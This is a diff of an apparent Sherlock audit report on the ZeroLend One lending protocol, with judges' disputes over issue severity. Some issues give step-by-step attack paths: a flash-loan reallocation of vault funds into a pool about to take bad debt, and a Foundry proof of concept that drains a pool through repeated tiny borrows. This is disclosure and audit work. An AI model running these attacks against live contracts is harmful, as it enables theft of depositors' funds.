+The above comment trying to invalidate the issue is incorrect. In fact, the curator would want to re-add the pool, once pool becomes available again, so as to recover the funds. Moreover, freezing and unfreezing reserves isn't necessarily indicative of malicious behavior; it can be part of normal operational procedures or some requirements (e.g. regulatory) for pool owners.
 
-**sherlock-admin3**
+**Honour-d-dev**
 
-1 comment(s) were left on this issue during the judging contest.
+@0xNirix 
+Freezing reserves does not prevent withdrawals though, you can check the [executeWithdraw](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/logic/SupplyLogic.sol#L123) and [validateWithdraw](https://github.com/zerolend/zerolend-one/blob/6b681f2a16be20cb2d43e544c164f913a8db1cb8/contracts/core/pool/logic/ValidationLogic.sol#L96) functions, freeing only prevents supply.
+So claims relying on freezing are invalid in this case.
 
-**Honour** commented:
->  Invalid: `scaledDownUserBalance` cannot be 0 if vars.liquidationProtocolFeeAmount != 0 because the liquidationProtocolFeeAmount is included in the `_calculateAvailableCollateralToLiquidate()` function
+If a pool is so compromised that it cannot be withdrawn from, then it doesn't makes sense for it to be added again. If it's a temporary compromise then the pool can just be shifted to be bottom of the withdraw queue (there's a functionality for this), instead of removing and loosing users funds. _**normal operational procedures**_ (as claimed in the above comment) should not be reason for removing a pool without properly reallocating funds since these are obviously temporary
+
+**0xNirix**
+
+> If a pool is so compromised that it cannot be withdrawn from, then it doesn't makes sense for it to be added again
+
+My point is that you as a curator still want to add the pool back to recover your funds when (and if) the pool becomes withdraw-able again. You can anyways restrict any new deposit from going to the pool, so you only expect to gain back the funds. Please remember curator does not control pool's manager action and cannot guess whether it is a temporary or permanent change.
+
+
+**Honour-d-dev**
+
+> My point is that you as a curator still want to add the pool back to recover your funds when (and if) the pool becomes withdraw-able again.
+
+Pool funds not being withdrawable does not mean it's compromised, and does not require drastic actions (e.g. removal) that risks users funds, lack of liquidity ( due to borrowing) can make a pool temporarily un-withdrawable. In this case the pool can be moved to the bottom of the withdraw queue until it has liquidity.
+
+Vault admins are expected to know this and act rationally
+
+**0xNirix**
+
+I think we are going in a bit of circles here, but please allow me to frame the argument again:
+It does not matter if the pool is compromised or not, or vault curator would be able to ascertain whether it is a temporary or permanent situation (which they can not always due to lack of control on pool owners actions, and vault curators have a limit on pools they can keep around in the withdraw queue).
+In any case, including the compromised pool case, if and when the vault owner sees an opportunity to get back the funds by re-adding the pool, they must do the re-addition. They would want to withdraw back their funds and can limit any further deposit. 
+
+That is precisely why the code exists in the first place in the addition flow, that explicitly adds back the account assets from the pool. There is even a comment saying no fee should be charged from these assets because you do not want to charge a fee on the entire principal that was lost (fees are only charged on interests). This further indicates an intentional and conscious re-addition of funds, where the vulnerability lies.
+
+```solidity
+       // Take into account assets of the new market without applying a fee.
+        pool.forceUpdateReserve(asset());
+        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);
+        _updateLastTotalAssets(lastTotalAssets + supplyAssets);
+```
+
+
+**Honour-d-dev**
+
+My point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.
+
+Any other inconvenience can be fixed by reallocating the funds before removal or rearranging the withdraw queue.
+
+The code is safely accounting for funds as donations are always possible 
+
+**0xNirix**
+
+> My point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.
+
+Absolutely my point as well, the re-addition applies to the compromised pools as well. Even if there was a security risk, that may get possibly resolved in future. Pease note the pools can be upgradeable according to Zerolend docs. 
+
+> Any other inconvenience can be fixed by reallocating the funds before removal or rearranging the withdraw queue.
+
+Incorrect, like I mentioned in my previous comment, vault curators have a limit on pools in the withdraw queue and they may not be able to keep waiting by parking pools in withdraw queue for pool owner to take some action.
+
+> The code is safely accounting for funds as donations are always possible
+
+The whole vulnerability is that the code infact fails to safely add funds while re-adding,  whether they are donations or past deposits.
+
+**Honour-d-dev**
+
+>Absolutely my point as well, the re-addition applies to the compromised pools as well. Even if there was a security risk, that may get possibly resolved in future
+
+Can you please provide a valid example of such a "compromise" that would cause a curator to remove a pool and re-added later.
+I believe you are yet to mention anything specific, besides freezing reserves, which is invalid.
+
+>Incorrect, like I mentioned in my previous comment, vault curators have a limit on pools in the withdraw queue and they may not be able to keep waiting by parking pools in withdraw queue for pool owner to take some action.
+
+This situation is very unlikely (even acknowledged by you, previously) that at at best only 1 or 2 pools can be experiencing it at any point in time. "parking pools" is obviously a stretch 
+
+**0xNirix**
+
+I was merely responding to your previous comment 
+
+> My point is that curators can be trusted to not remove pools with user funds unless there is a security risk involved for the vault itself (i.e. vault can be exploited via pool) , in which case the pool cannot be re-added due to said security risk.
+
+Even in these cases, you may want to add back the pool when the security risk gets resolved e.g. via upgrade.
+
+> This situation is very unlikely (even acknowledged by you, previously) that at at best only 1 or 2 pools can be experiencing it at any point in time. "parking pools" is obviously a stretch
+
+I don't see any of my comment saying this is unlikely. Anyways, even if  1 or 2 pools are impacted, they can still cause this issue if the vault is already running close to the withdraw queue limit which is rather small (30). 
+
+At this point of time, I think this exchange is not making progress and converging and we are repeating same set of arguments. Will wait for HoJ to step in.
+
+**cvetanovv**
+
+I agree with @0xNirix points.
+
+The re-addition of a pool, even after encountering issues, is possible. Vault curators don’t have control over pool manager actions, so re-adding a previously removed pool when it becomes withdrawable again is also possible.
+
+When pools are removed and then re-added, this vulnerability emerges due to the way assets are immediately accounted for. This means that there is a real edge case for this attack to happen without the curator making a mistake.
+
+Planning to reject the escalation and leave the issue as is.
+
+**0xSpearmint**
+
+@cvetanovv This issue is invalid.
+
+The issue requires that the curator removes a pool **WITHOUT** reallocating all the assets out of it. This makes 0 sense to do since the vault is forfeiting all the depositors assets in that pool. Pools with assets should never be removed temporarily, there is no valid reason to do so.
+
+Even if the pool is somehow compromised, the curator should first try to reallocate any funds out of the pool and then set the cap to 0 to prevent further deposits but still allow withdrawals from that pool.
+
+The report describes a scenario where the vault curator makes a mistake that causes fund loss to vault depositors, which is not a valid issue.
 
 
 
-**nevillehuang**
+**0xNirix**
 
-request poc
+All the points in above comment have already been discussed in this thread. Please do not repeat arguments just trying to invalidate the issue.
 
-BNB behavior of reverting zero transfers is true, however unsure if issue is correct, need to see a PoC
+> Even if the pool is somehow compromised, the curator should first try to reallocate any funds out of the pool and then set the cap to 0 to prevent further deposits but still allow withdrawals from that pool.
+
+Really? 
+As a curator, you would definitely not want to keep a  pool which is compromised (and may have any vulnerability including in the withdrawal path) attached to your vault in any way.
+In fact, you would remove it right away and see if the pool owner can potentially resolve it and then re-add the pool so that you can get back your funds, once it is safe.
+
+
+
+
+
+**Honour-d-dev**
+
+The reason I believe this issue is invalid is because under current pool and vault implementation there's no valid **compromise** that would require a pool to be removed without reallocating funds and then re-added later
+
+@0xNirix has not been able to provide a valid situation where such a process is the only solution.
+The reason for that is obviously because such a situation does not exist and the entire issue is based on a hypothetical unspecified **compromise** 
+
+Of course @0xNirix can provide a plausible example if there is one.
+
+**0xNirix**
+
+This is amusing. First you guys yourselves bring up "compromise" scenarios that according to you are feasible but does not apply here, trying to invalidate the issue. The ones where you think it may warrant removal of pool with assets but no re-addition or even no removal in the first place, and when I counter that even in such conditions you may have to remove and re-add, you go back and ask where is the scenario?
+
+Let me clarify for one last time what I have already mentioned clearly in my comments earlier. My stand from day one has been that it is perfectly feasible for a curator to remove pools with assets for both non-compromised or compromised scenarios. One such scenario I had mentioned was when the pool may be non-withdrawable for a long time as no repayments are done. Pool owner may further aggravate this situation by freezing assets so no more deposits can come. Curator does not know if repayments will ever come or if pool owner will ever remove freeze to allow more deposits. They may take a rational decision to write off this bad debt for the moment. This is a standard practice that is done by even physical banks. Why? Because you do not want to impact your new depositors when you know with whatever information you have that part of your assets may not be returned. Otherwise you risk lowering their final yield by socializing old losses with new depositors, eventually discouraging new vault depositors. However, in this particular case, vault has a real limitation that will force curator to remove such pools with assets from the withdraw queue even earlier. This because a vault can only keep limited (up to 30 pools) in its withdraw queue, so if a vault is running near its capacity of 30 pools and even one pool has some issues they may be forced to take such call sooner than later. Now, if the pool owner decides to allow deposits again, curator will see a chance to get their funds back and hence would want to re-add the pool. This is just one scenario but all the compromise scenarios that you thought do not apply but are feasible are actually applicable too and there is real risk of vault losing funds because of this vulnerability in many such scenarios overall.
+
+Will wait for HoJ to take a final call.
+
+
+
+
+
+**Honour-d-dev**
+
+@0xNirix it is your report that first mentions an **issue** but fails to provide a valid example as we see here
+> **Isn't it impossible to add a market with existing funds?**
+A: No, it's actually possible and even anticipated in two scenarios:
+Reintegrating a previously removed market with leftover funds, e.g. A market removed due to an **_issue_**, but not all funds were withdrawn.
+
+> My stand from day one has been that it is perfectly feasible for a curator to remove pools with assets for both non-compromised or compromised scenarios
+
+No rational curator would remove a pool for non-compromised scenarios, this is because users who withdraw before the pool is re-added would definitely suffer a loss and waiting for the pool to be re-added is not an option as they don't know when it'll be added or if it ever will be. 
+Pool removal with leftover funds is a **last resort solution** due to this reason and should not be taken lightly
+
+> One such scenario I had mentioned was when the pool may be non-withdrawable for a long time as no repayments are done. Pool owner may further aggravate this situation by freezing assets so no more deposits can come. Curator does not know if repayments will ever come or if pool owner will ever remove freeze to allow more deposits. They may take a rational decision to write off this bad debt for the moment. 
+
+This scenario is invalid, if a pool is non-withdrawable due to lack of funds, even if the pool owner freezes the asset repayments will still be possible because freezing does not affect repayments. In this scenario a rational curator will simply reorder the withdraw queue and wait for those repayments instead of removing the market and costing users their funds. 
+
+It is very obvious that currently this issue has no possible scenario, and also obvious that it cannot be medium severity
+
+
+**0xNirix**
+
+@Honour-d-dev, please read my entire comment. I have clearly explained why it may be necessary and rational for a curator to remove a pool rather than simply reorder it.
+
+@cvetanovv, I apologize for this late request, but upon further consideration, I believe this issue should be upgraded to **High**. The impact of this issue is very similar to issue #233, which was judged high, where a pool owner could maliciously set incorrect interest rates causing withdrawals to revert. Eventually, a curator would reasonably consider such funds lost and remove the pool. They would need to remove such failing pools from their withdrawal queues for the reasons I explained in https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2432814025: to prevent losses to the new depositors and/or due to withdrawal queue limitations. Later, the pool owner could correct the interest rate, and the curator would want to re-add the pool to the vault. However, the pool owner would then execute this attack from a different wallet. The impact would be identical - loss of vault funds that were in the pool, and the pool owner could even claim they have no malicious intent.
+
+**Honour-d-dev**
+
+> @Honour-d-dev, please read my entire comment. I have clearly explained why it may be necessary and rational for a curator to remove a pool rather than simply reorder it.
+
+I read your comment, I believe the 30 pool limit is not a valid reason either. Reordering to preserve users funds if possible should have more priority over adding new pools. If a pool already has 30 pools in it and one is temporarily non-withdrawable, surely there're 29 other working pools, no?
+
+> a pool owner could maliciously set incorrect interest rates causing withdrawals to revert. Eventually, a curator would reasonably consider such funds lost and remove the pool. They would need to remove such failing pools from their withdrawal queues for the reasons I explained in https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2432814025: to prevent losses to the new depositors and/or due to withdrawal queue limitations. Later, the pool owner could correct the interest rate, and the curator would want to re-add the pool to the vault.
+
+This example is also invalid , a rational curator would never re-add a pool with a malicious pool owner that can set incorrect interest rates, whether they choose to correct the rates or not. The security risks are vey obvious from adding such a pool.
+
+@cvetanovv This issue does not even meet medium severity, i think it's obvious at this point that there is no valid scenario where such a thing is the only **rational** choice, judging by how difficult it is for @0xNirix to provide one.
+
+**There are only 2 possible cases here**
+1. if a pool/pool admin is malicious and cannot be withdrawn from, it should be removed and never re-added (it makes no sense to re-add a malicious pool even if it appears to be  working correctly)
+2. If the pool is not compromised but temporarily non-withdrawable it should be reordered instead of removed ( because removing might still cost some users their funds an i stated [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2433201858))
+
+**0xNirix**
+
+Here we go again in circles!
+
+> I read your comment, I believe the 30 pool limit is not a valid reason either. Reordering to preserve users funds if possible should have more priority over adding new pools. If a pool already has 30 pools in it and one is temporarily non-withdrawable, surely there're 29 other working pools, no?
+
+Please stop replying to only part of the argument. I will just repeat - please re-read the entire comment again to see why curator may rationally decide to remove a pool.
+
+> This example is also invalid , a rational curator would never re-add a pool with a malicious pool owner that can set incorrect interest rates, whether they choose to correct the rates or not. The security risks are vey obvious from adding such a pool.
+
+Probably repeating this for the nth time as well - how does curator know that pool owner is malicious or simply made a mistake? 
+And even if malicious pool owner, why not, if curator can very well ensure that there is no downside (because no new deposit would go to the pool) and there is only upside (can potentially get funds back).
+
+> if a pool/pool admin is malicious and cannot be withdrawn from, it should be removed and never re-added (it makes no sense to re-add a malicious pool even if it appears to be working correctly)
+> If the pool is not compromised but temporarily non-withdrawable it should be reordered instead of removed ( because removing might still cost some users their funds an i stated https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143#issuecomment-2433201858)
+
+I have given examples for both these cases with clear reasons on how a curator might end up removing and then re-adding pool. It should be pretty obvious that this is an High issue, given other similar judgements.
+
+**cvetanovv**
+
+This issue is not High severity. To be High severity, we should not have any restrictions. Only the fact that the attack is only possible with certain curator actions makes this a Medium/Low severity. 
+
+The core of the issue lies in the lack of a clear mechanism to prevent sandwich attacks when adding or re-adding pools with existing funds.
+
+There are a few scenarios where re-adding a previously removed pool—either compromised or non-withdrawable due to temporary liquidity constraints. And the curators can’t control pool management actions. Attackers could exploit the updated asset-share ratio post-addition to profit at the expense of existing users.
+
+Given these factors, I agree that this is a valid concern and can be Medium severity.
+
+**WangSecurity**
+
+Result:
+Medium
+Unique
 
 **sherlock-admin4**
 
-PoC requested from @ObsidianAudits
+Escalations have been resolved successfully!
 
-Requests remaining: **12**
+Escalation status:
+- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143/#issuecomment-2391978988): rejected
 
-**ObsidianAudits**
+# Issue M-4: `GenericLogic.sol` contract assumes all price feeds has the same decimals but is a wrong assumption that leads to an incorrect health factor math. 
 
-Hi @nevillehuang 
-
-Here is the PoC:
-```solidity
-function testJ_fullLiquidation() external {
-        _generateLiquidationCondition();
-        poolFactory.setLiquidationProtcolFeePercentage(1e2); // Set a 1% protocol fee
-
-        vm.startPrank(bob);
-        pool.liquidateSimple(address(tokenA), address(tokenB), pos, supplyAmountA);
-  }
-  ```
-  You can add the test to `PoolLiquidationTests.t.sol`
-  
-Add the following log in `LiquidationLogic.executeLiquidationCall()`:
-```diff
-  // Transfer fee to treasury if it is non-zero
-    if (vars.liquidationProtocolFeeAmount != 0) {
-      uint256 liquidityIndex = collateralReserve.getNormalizedIncome();
-      uint256 scaledDownLiquidationProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);
-      uint256 scaledDownUserBalance = balances[params.collateralAsset][params.position].supplyShares;
-
-      if (scaledDownLiquidationProtocolFee > scaledDownUserBalance) {
-        vars.liquidationProtocolFeeAmount = scaledDownUserBalance.rayMul(liquidityIndex);
-      }
-
-+    console.log("Fee amount to transfer %e", vars.liquidationProtocolFeeAmount);
-
-      IERC20(params.collateralAsset).safeTransfer(IPool(params.pool).factory().treasury(), vars.liquidationProtocolFeeAmount);
-    }
-```
-    
-**Console output**:
- ```bash
-[PASS] testJ_fullLiquidation() (gas: 945182)
-Logs:
-Fee amount to transfer 0e0
-
-Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.35ms (1.89ms CPU time)
-
-Ran 1 test suite in 12.09ms (5.35ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
-```
-
-Also it requires the fix from https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/228 to be applied, because otherwise the collateral balance of the user is not reduced by the correct amount.
-
-# Issue M-8: A malicious user can re-allocate vault funds into a pool that is about to experience bad debt to cause significant loss for the vault 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/282 
+Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166 
 
 ## Found by 
-Obsidian
+000000, A2-security, Honour, Obsidian, coffiasd, iamnmt, nfmelendez, silver\_eth, stuart\_the\_minion
 ### Summary
 
-An attacker can use flash loans to re-allocate the funds of any vault into whichever pools they choose, this is best described in a set of steps.
+Mixing price feeds decimals when doing the calculation of  `totalCollateralInBaseCurrency` and `totalDebtInBaseCurrency` will cause an incorrect `healthFactor` affecting important operations of the protocol such as `liquidation`, `borrow` and `withdraw`. `GenericLogic.sol` contract assumes all price feeds have the same decimals but is a wrong assumption as is demonstrated in the Root cause section.
 
-Assume a vault deposits into pools A, B and C. Assume each pool has a cap of 60 ETH. The deposit queue is [A,B,C]. The withdraw queue is [A,B,C]. Note that all these numbers and orders are 100% arbitrary, the attack can be performed for any variation or caps/order.
-
-Currently the allocations are as follows:
-
-Pool A has 20 ETH deposited
-Pool B has 20 ETH deposited
-Pool C has 20 ETH deposited
-
-Here is how the attacker can re-allocate all the funds into Pool C:
-
-1. Attacker takes a flash loan of 120 ETH
-2. Attacker [deposits](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L322) 40 ETH into the vault, this will fill the cap for Pool A
-3. Attacker deposits 40 ETH into the vault, this will fill the cap for Pool B
-4. Attacker deposits 40 ETH into the vault, this will fill the cap for Pool C
-5. Attacker withdraws 120 ETH, this will pull 60 from pool A and 60 from pool B
-6. Attacker repays the 120 ETH flash loan (no fees since it was from balancer/maker)
-
-Here is the allocation after the attack:
-
-Pool A has 0 ETH deposited
-Pool B has 0 ETH deposited
-Pool C has 60 ETH deposited
-
-The issue occurs when a pool is about to be in bad debt, an attacker can re-allocate all the vault's funds into the pool that will experience bad debt to cause a severe loss to the depositors.
+https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L106-L128
 
 ### Root Cause
 
-Anybody can use flash loans to arbitrarily reallocate vault allocations.
+`GenericLogic.sol:69 calculateUserAccountData` calculates the `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency` doing a sum of all the differents reserve assets as collateral or debt in base currency but the problem is a wrong assumption that all chainlink price feeds has the same decimals. Most USD price feeds has 8 decimals but for example [AMPL / USD](https://etherscan.io/address/0xe20CA8D7546932360e37E9D72c1a47334af57706) feed has 18 decimals. So `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency` will be incorrect because `calculateUserAccountData` will sum asset prices with different decimals leading to a wrong calculation of the health factor and incorrect function of many protocol operations. 
 
 ### Internal pre-conditions
 
-Any pool supplied by vault is about to experience bad debt
+1. Price feeds for collateral or debt assets in a given position needs to have different decimals.
+
 
 ### External pre-conditions
 
-_No response_
+None
 
 ### Attack Path
 
-1. Attacker is observing the mempool looking for any pool that is deposited to from a vault, that has accumulated bad debt BUT not realised it yet 
-2. Attacker re-allocates the vault’s funds into the bad debt pool using flash loans
-3. When the bad debt is realised the vault depositors will experience a huge loss
+Is a wrong assumption proven by example
+
 
 ### Impact
 
-Vault depositors experience a severe loss since their funds were re allocated into a pool that experienced bad debt
+1. Liquidation: Mixing Price decimals lead to incorrect calculation of the `healthFactor` that is a result of wrong `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency`.
+2. Borrow: Wrong `healthFactor` also affects borrowing when doing validations to make sure that the position is not liquiditable.
+3. Withdraw: Also uses `healthFactor` via `ValidationLofic::validateHFAndLtv`
+4. executeUseReserveAsCollateral: Also uses `healthFactor` via `ValidationLofic::validateHFAndLtv`
+5. Any other operation that uses the health factor.
 
-Another point to note is that bad debt is not socialised in the protocol, this makes the impact even more severe if other pool suppliers withdraw first leaving the vault depositors with nothing
 
 ### PoC
 
-_No response_
+none
 
 ### Mitigation
 
-_No response_
+There are 2 possible solution:
+
+1. Some protocols enforce 8 decimals when assigning an oracle to an asset or reject the operation. (easy, simple, secure, not flexible)
+2. Use AggregatorV3Interface::decimals to normalize to N decimals the price making sure that the precision loss is on the correct side. (flexible)
+
 
 
 
 ## Discussion
 
-**sherlock-admin4**
+**nevillehuang**
 
-1 comment(s) were left on this issue during the judging contest.
+As seen [here](https://github.com/sherlock-audit/2024-06-new-scope?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-protocols-you-integrate-with-including-restrictions-on-array-lengths)
 
-**Honour** commented:
->  Invalid: Claims order doesn't matter but from the details the pool must be the last pool in the withdraw queue and must be about to experience bad debt . very unlikely 
+> Q: Are there any limitations on values set by admins (or other roles) in protocols you integrate with, including restrictions on array lengths?
+> No
 
+There is no limits to admin set chainlink oracles, so it is presumed that they will act accordingly when integrating tokens.
 
+> (External) Admin trust assumptions: When a function is access restricted, only values for specific function variables mentioned in the README can be taken into account when identifying an attack path.
 
-# Issue M-9: Small amount of borrow can drain pool 
+> If no values are provided, the (external) admin is trusted to use values that will not cause any issues.
 
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/291 
+**Honour-d-dev**
 
-## Found by 
-0xMax1mus, almurhasan, dany.armstrong90, danzero, oxelmiguel
-### Summary
+Escalate 
 
-A user can supply some amount of a token and borrow a small amount of a token from the pool and withdraw the initial amount they supplied without repaying the borrowed amount which could cause insolvency for the pool.
+this issue is valid!
 
-### Root Cause
+The above [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543) is not a valid reason for it to be invalid, pools are permissionless and anyone can create a pool and choose to integrate these tokens with un-conventional price feed decimals and the impact on users can be severe especially if not detected early.
 
-https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L124
-The `validateBorrow` function In `ValidationLogic.sol` is used to validate borrow request from the user, currently it only requires that the borrowed amount is not 0, this allows user to borrow a minuscule amount of token.
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L239
-The `validateHealthFactor` function in `ValidationLogic.sol` validate the requested amount of withdrawal from the user corresponding to the health factor.  The `healthFactor` variable returned from the `GenericLogic.calculateUserAccountData` function is compared with the `HEALTH_FACTOR_LIQUIDATION_THRESHOLD`  to be bigger or equal or else it reverts with an error. 
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L69
-Inside the `calculateUserAccountData` function the `vars.totalDebtInBaseCurrency` variable determines the `healthFactor` variable. The `vars.totalDebtInBaseCurrency` variable is increased by the `_getUserDebtInBaseCurrency` function. 
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L184
-Inside this function the `usersTotalDebt` variable is divided by the  `assetUnit` variable which is fetched from the reserve configuration of the asset. This is a problem if the `assetUnit` is bigger than the `usersTotalDebt` as it will amount to 0 in the end which would set the `healthFactor` variable to `type(uint256).max` which would allow the user to withdraw the initial amount that is supplied while still keeping the borrowed amount.
-
-### Internal pre-conditions
-
-1. Reserve Configuration of the asset needs to be borrowable :
-- frozen: false
-- borrowable: true
-
-### External pre-conditions
-
-1. At least 1 user needs to supply the token in the pool for an attacker to exploit this vulnerability.
-
-### Attack Path
-
-1. User 1 supply 1e18 wei of token A
-2. Attacker supply 1e13 wei of token A at position index 0
-3. Attacker borrow 1e9*9 wei of token A at position index 0
-4. Attacker withdraw initial supplied amount of token A at position index 0
-5. Attacker repeat step 2 - 4 for possibly thousands of times at incrementing position index (1,2,3....) 
-6. User 1 withdraw initial supplied amount of token A (Revert error)
-
-### Impact
-
-- Pool insolvency
-- Loss of funds for users
-- Reputational damage for the protocol
-
-### PoC
-
-```solidity
-// SPDX-License-Identifier: BUSL-1.1
-pragma solidity 0.8.19;
-
-import {MintableERC20} from '../../../../contracts/mocks/MintableERC20.sol';
-import {PoolEventsLib, PoolSetup} from '../../core/pool/PoolSetup.sol';
-import {console2} from '../../../../lib/forge-std/src/console2.sol';
-import {stdError} from '../../../../lib/forge-std/src/StdError.sol';
-import {DataTypes} from '../../../../contracts/core/pool/configuration/DataTypes.sol';
-import {ReserveConfiguration} from '../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';
-
-contract mytest is PoolSetup {
-  function setUp() public {
-    _setUpPool();
-
-    console2.log('This:', address(this));
-    console2.log('msg.sender:', address(msg.sender));
-    console2.log('owner:', address(owner));
-    console2.log('whale:', address(whale));
-    console2.log('ant:', address(ant));
-    console2.log('governance:', address(governance));
-  }
-
-  function testSmallBorroWithdraw() external {
-    
-    uint256 index = 0;
-    pos = keccak256(abi.encodePacked(address(owner), 'index', uint256(index)));
-    uint256 mintAmount = 5 ether;
-
-    tokenA.mint(owner, mintAmount);
-    tokenA.mint(whale, mintAmount);
-    tokenA.mint(ant, mintAmount);
-
-    vm.startPrank(owner);
-    tokenA.approve(address(pool), mintAmount * 1e9);
-
-    vm.startPrank(ant);
-    tokenA.approve(address(pool), mintAmount * 1e9);
-
-    vm.startPrank(whale);
-    tokenA.approve(address(pool), mintAmount * 1e9);
-
-    console2.log('Owner Balance: ', tokenA.balanceOf(owner));
-    console2.log('Ant Balance: ', tokenA.balanceOf(ant));
-    console2.log('Whale Balance: ', tokenA.balanceOf(whale));
-    console2.log('Pool Balance: ', tokenA.balanceOf(address(pool)));
-
-    vm.startPrank(whale);
-    pool.supplySimple(address(tokenA), whale, mintAmount, index);
-    // pool.borrowSimple(address(tokenA), whale, mintAmount/2, index);
-    // pool.withdrawSimple(address(tokenA), whale, mintAmount, index);
-
-    vm.startPrank(owner);
-
-    //Why only 4000 ? Avoid out of gas error, there could be a way to bypass this in foundry but due to time constraint, this is the best POC for now...
-    for(uint i = 0; i < 4000; i++){
-      pool.supplySimple(address(tokenA), owner, mintAmount, index+i);
-      pool.borrowSimple(address(tokenA), owner, 1e9*9, index+i);
-      pool.withdrawSimple(address(tokenA), owner, mintAmount, index+i);
-
-      // console2.log(i);
-
-    }
-
-    // pool.borrowSimple(address(tokenA), owner, 1e9, index);
-
-    // vm.startPrank(ant);
-    // pool.supplySimple(address(tokenA), ant, mintAmount, index);
-    // pool.borrowSimple(address(tokenA), ant, 1e9*9, index);
-    // // pool.repaySimple(address(tokenA), 1e9*9, index);
-    // pool.withdrawSimple(address(tokenA), ant, mintAmount, index);
-
-    console2.log('Owner Debt: ', pool.getDebt(address(tokenA), owner, 0));
-    // console2.log('Ant Debt: ', pool.getDebt(address(tokenA), ant, 0));
-
-    console2.log('Owner Balance: ', tokenA.balanceOf(owner));
-    // console2.log('Ant Balance: ', tokenA.balanceOf(ant));
-    console2.log('Whale Balance: ', tokenA.balanceOf(whale));
-    console2.log('Pool Balance: ', tokenA.balanceOf(address(pool)));
-
-    vm.startPrank(whale);
-    pool.withdrawSimple(address(tokenA), owner, mintAmount, index); //[FAIL. Reason: panic: arithmetic underflow or overflow (0x11)]
-
-  }
-}
-
-```
-
-### Mitigation
-
-Fix the require statement in  `validateBorrow` function In `ValidationLogic.sol` such that it the minimum borrowed amount depends on the decimals of the asset borrowed. An attacker can get away borrowing 1e9 of an asset with 1e18 decimal but fails when it tries to borrow 1e10, hence the require statement could be something like "minimum borrow amount needs to be 8 decimal difference to the asset decimal". Could be something like this:
-
-```solidity
-uint256 minAmount = 10 ** params.cache.reserveConfiguration.getDecimals() / 1e8;
-require(params.amount >= minAmount, PoolErrorsLib.INVALID_AMOUNT);
-```
-
-
-
-## Discussion
+If the argument is that the oracle can be removed or the token can be paused by admin if such an issue occurs, the impact is still severe (loss of funds for users , liquidation etc) and not reversible. Such cases can be easily prevented by the mitigation provided in the report.
 
 **sherlock-admin3**
 
-1 comment(s) were left on this issue during the judging contest.
+> Escalate 
+> 
+> this issue is valid!
+> 
+> The above [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543) is not a valid reason for it to be invalid, pools are permissionless and anyone can create a pool and choose to integrate these tokens with un-conventional price feed decimals and the impact on users can be severe especially if not detected early.
+> 
+> If the argument is that the oracle can be removed or the token can be paused by admin if such an issue occurs, the impact is still severe (loss of funds for users , liquidation etc) and not reversible. Such cases can be easily prevented by the mitigation provided in the report.
 
-**Honour** commented:
->  Possibly invalid along with dupes #137 #148 #390. Code is a fork of AAVE and aave doesn't implement a min. borrow. Cant't drain pool as it would require 10^9 (txs/ loops in a single tx) to borrow 1e18 token worth of debt. it's difficult to say how much can actually be borrowed using this.
+You've created a valid escalation!
 
+To remove the escalation from consideration: Delete your comment.
 
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
 
-# Issue M-10: After a User withdraws The interest Rate is not updated accordingly leading to the next user using an inflated index during next deposit before the rate is normalized again 
+**cvetanovv**
+
+The Lead Judge is right with his comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543
+
+In addition, pool managers are expected to act rationally(i.e. are trusted):
+
+> Essentially we expect all permissioned actors to behave rationally.
+>
+> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.
+
+The only valid variant of this issue is if there was mention of the malicious attack path. Then, I would duplicate it with #234.
+
+Planning to reject the escalation and leave the issue as is.
+
+**Honour-d-dev**
+
+@cvetanovv 
+
+The point here is pool creation is permissionless, so anyone can create a pool (become a pool manager) and add whichever tokens they like to their pool. The possibility of adding an oracle with wrong decimals cannot be attributed to irrational behavior(or being malicious) as there is no guarantee that the pool manager is aware of the fact that price feed decimals are not normalized (see second recommendations #166 and #442 ) in zerolend.
+
+This can happen even if pool managers behave rationally (with good intentions) and can cause severe and irreversible damage to users before it's corrected. It's better to completely prevent the possibility of such cases as the chances of this happening is pretty high given the permissionless nature of pools.
+
+**cvetanovv**
+
+@Honour-d-dev 
+
